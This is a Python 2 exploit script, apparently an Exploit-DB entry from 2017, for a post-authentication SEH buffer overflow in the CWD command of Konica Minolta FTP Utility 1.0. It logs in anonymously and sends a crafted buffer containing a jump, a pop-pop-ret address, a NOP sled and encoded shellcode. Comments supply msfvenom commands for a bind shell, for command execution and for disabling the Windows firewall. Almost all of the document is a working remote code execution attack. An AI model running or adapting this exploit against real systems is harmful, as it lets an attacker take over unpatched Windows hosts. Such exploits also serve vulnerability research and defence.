# Title: Konica Minolta FTP Utility 1.00 Post Auth CWD Command SEH Overflow
# Published: Jun 14 2017
# Software link: http://download.konicaminolta.hk/bt/driver/mfpu/ftpu/ftpu_10.zip
# Software: Konica Minolta FTP Utility v1.0
# CVE: NaN
# Type: Remote
# Platform: Windows

#!/usr/bin/python
# -*- coding: utf-8 -*-

import socket
import sys

if len(sys.argv) <= 1:
	print " EXPLOIT - Post Auth CWD Command SEH Overflow"
	print "   Target: Konica Minolta FTP Utility v1.0\n"
	print " ./"+sys.argv[0]+" [TARGET IP]"
else:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
	# Shellcode examples:
	# msfvenom -p windows/exec cmd='ping 192.168.100.2' -f python -b "\x00\x0a\x0d\x3d\x5c\x2f" --smallest
	# msfvenom -p windows/shell/bind_tcp LPORT=1 -f python -b "\x00\x0a\x0d\x3d\x5c\x2f" --smallest
	# msfvenom -p windows/exec cmd='netsh firewall set opmode disable' -f python -b "\x00\x0a\x0d\x3d\x5c\x2f" --smallest
	buf =  b""
	buf += b"\x6a\x37\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73"
	buf += b"\x13\x69\x1a\x89\x37\x83\xeb\xfc\xe2\xf4\x95\xf2"
	buf += b"\x0b\x37\x69\x1a\xe9\xbe\x8c\x2b\x49\x53\xe2\x4a"
	buf += b"\xb9\xbc\x3b\x16\x02\x65\x7d\x91\xfb\x1f\x66\xad"
	buf += b"\xc3\x11\x58\xe5\x25\x0b\x08\x66\x8b\x1b\x49\xdb"
	buf += b"\x46\x3a\x68\xdd\x6b\xc5\x3b\x4d\x02\x65\x79\x91"
	buf += b"\xc3\x0b\xe2\x56\x98\x4f\x8a\x52\x88\xe6\x38\x91"
	buf += b"\xd0\x17\x68\xc9\x02\x7e\x71\xf9\xb3\x7e\xe2\x2e"
	buf += b"\x02\x36\xbf\x2b\x76\x9b\xa8\xd5\x84\x36\xae\x22"
	buf += b"\x69\x42\x9f\x19\xf4\xcf\x52\x67\xad\x42\x8d\x42"
	buf += b"\x02\x6f\x4d\x1b\x5a\x51\xe2\x16\xc2\xbc\x31\x06"
	buf += b"\x88\xe4\xe2\x1e\x02\x36\xb9\x93\xcd\x13\x4d\x41"
	buf += b"\xd2\x56\x30\x40\xd8\xc8\x89\x45\xd6\x6d\xe2\x08"
	buf += b"\x62\xba\x34\x70\x88\xba\xec\xa8\x89\x37\x69\x4a"
	buf += b"\xe1\x06\xe2\x75\x0e\xc8\xbc\xa1\x79\x82\xcb\x4c"
	buf += b"\xe1\x91\xfc\xa7\x14\xc8\xbc\x26\x8f\x4b\x63\x9a"
	buf += b"\x72\xd7\x1c\x1f\x32\x70\x7a\x68\xe6\x5d\x69\x49"
	buf += b"\x76\xe2\x07\x7f\xfd\x44\x01\x3a\xef\x5e\x1b\x7f"
	buf += b"\xfe\x56\x05\x76\xa9\x44\x0c\x6e\xa9\x58\x19\x77"
	buf += b"\xe6\x53\x0c\x3a\xed\x5e\x1a\x7b\xeb\x5b\x0c\x1a"
	buf += b"\x89\x37"
	
	# Buffer = 1500 bytes
	# buffer = "\x41" * 1037 + "\xeb\x0a\x90\x90" + "\x9D\x6D\x20\x12" + "\x90" * 5 + buf + "D" * 1955
	buffer = "\x41" * 1037 + "\xeb\x0a\x90\x90" + "\x9D\x6D\x20\x12" + "\x90" * 5 + buf + "D" * (1500 - 1050 - len(buf))

	print " EXPLOIT - Post Auth CWD Command SEH Overflow"
	print "   Target: Konica Minolta FTP Utility v1.0\n"
	print " [*] Sending " + str(len(buffer)) + " bytes..."
	s.connect((sys.argv[1],21))
	data = s.recv(1024)
	s.send('USER anonymous' + '\r\n')
	data = s.recv(1024)
	s.send('PASS anonymous' + '\r\n')
	data = s.recv(1024)
	s.send('CWD ' + buffer + '\r\n')
	s.close
